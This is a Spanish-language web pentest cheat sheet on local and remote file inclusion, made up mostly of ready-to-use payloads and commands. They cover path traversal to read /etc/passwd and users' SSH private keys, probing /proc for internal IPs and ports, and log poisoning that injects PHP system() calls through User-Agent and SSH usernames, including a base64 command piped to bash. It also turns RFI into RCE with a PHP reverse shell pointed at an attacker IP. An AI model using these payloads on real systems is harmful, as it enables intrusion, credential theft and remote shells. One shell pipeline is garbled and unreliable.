# LFI
### Directory traversal | File path traversal
Replace LFI payloads:
../../../etc/passwd%00.png
to
../../../etc/passwd%00index.html
EJP:
```shell
/image?filename=25.jpg
```

```bash
/image?filename=../../../etc/passwd%00.png
```

### Para ir al principio

```bash
/image?filename=../../../../../../../../../../../../../etc/passwd
```

### Usuarios

```bash
curl -s "/image?filename=/etc/passwd" | grep "sh$"
```

### ID_RSA por usuario

```bash
/image?filename=/home/<user>/.ssh/id_rsa
```

### Procesos que se estan ejecutando

```bash
/image?filename=/proc/sched_debug
```

### Obtener ip interna, loopback y interfaces de red ( Docker ).

```bash
curl -s "/image?filename=/proc/net/fib_trie" | grep -i "host local" -B 1 | grep -oP '\d{1,3},\.\d{1,3},\.\d{1,3},\.\d{1,3}'
```

### Obtener puertos internos.

```bash
for port in $(curl -s "/image?filename=/proc/net/tcp" | awk '{print $2}' | grep -v "local_address" | awk '{print $2}' FS=":" | sort -u); do echo $(echo "ibase=16; $port" | bc); done
```

### Log Poisoning

#### Por apache2

```bash
curl -s -H "User-Agent: <?php system('whoami'); ?>" "/image?filename=/var/log/apache2/access.log"
```

En el navegador ir a: /image?filename=/var/log/apache2/access.log y el php interpretara el whoami dando www-data

#### Por auth - ssh

```bash
/var/log/auth.log"
```

ssh '<?php system("echo d2hvYW1pCg== | base64 -d | bash"); ?>'@<ip>

En el navegador ir a: /image?filename=/var/log/auth.log y el php interpretara el whoami en base64 dando www-data

### RFI a RCE
Detectar si se pide un archivo, en este caso un wp-load.php
```bash
php -S 0.0.0.0:8000
/image?filename=http://<ip>/
[404]:(null) /wp-load.php - No such file or directory
```
  
https://pentestmonkey.net/tools/web-shells/php-reverse-shell - download php-reverse-shell-1.0.tar.gz

```bash
tar -xf php-reverse-shell-1.0.tar.gz | mv 7z x php-reverse-shell-1.0/php-reverse-shell.php wp-load.php
sed -i 's/127.0.0.1/<ip-attacante>/' wp-load.php 
sed -i 's/1234/443/' wp-load.php 
```

En el navegador ir a: /image?filename=http://<ip>/
  
## References:

LFI Bypass + RFI + Wrappers

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#lfi--rfi-using-wrappers
